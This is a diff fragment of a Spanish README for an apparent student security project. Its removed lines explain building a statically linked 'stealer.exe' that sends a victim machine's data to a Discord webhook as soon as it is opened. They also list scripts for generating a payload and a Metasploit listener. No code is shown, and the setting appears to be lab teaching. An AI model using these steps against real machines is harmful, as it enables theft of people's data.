-El parámetro `-static` incluye todas las librerías necesarias dentro del exe para que funcione en cualquier Windows sin necesitar instalar nada adicional.
-
-Si la compilación termina sin errores, el archivo `stealer.exe` quedó listo en el mismo directorio. Pásalo a una máquina Windows para probarlo. En cuanto lo abras, en tu canal de Discord aparecen los mensajes con toda la información.
-
-Para probarlo en el mismo Kali usando una máquina virtual de Windows, primero copia el exe a una carpeta compartida o súbelo temporalmente a cualquier servicio de archivos, luego lo bajas en la VM y lo ejecutas. Si configuraste el webhook correctamente, los datos llegan en segundos.
-
----
-
-## Estructura del repositorio
-
-```
-grupo4-seguridad/
-    README.md                   explicación completa del proyecto paso a paso
-    setup.sh                    instala todas las dependencias en Kali de una sola vez
-    generar_payload.sh          genera el payload pidiendo la IP, con salida clara
-    listener.rc                 configura el handler de Metasploit automáticamente
-    capturas/                   carpeta para las screenshots del proyecto funcionando
-```
+`PyInstaller` es una herramienta que convierte un script de Python en un ejecutable independiente que no necesita Python instalado para correr.
 
 ---
 
